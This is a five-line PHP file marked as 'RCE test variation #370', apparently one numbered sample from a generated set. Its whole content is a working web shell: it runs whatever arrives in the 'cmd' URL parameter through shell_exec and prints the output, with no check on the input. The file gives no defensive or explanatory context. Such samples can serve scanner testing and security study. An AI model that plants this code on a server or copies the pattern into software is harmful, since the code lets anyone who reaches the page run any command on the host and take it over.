<?php
// RCE test variation #370
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>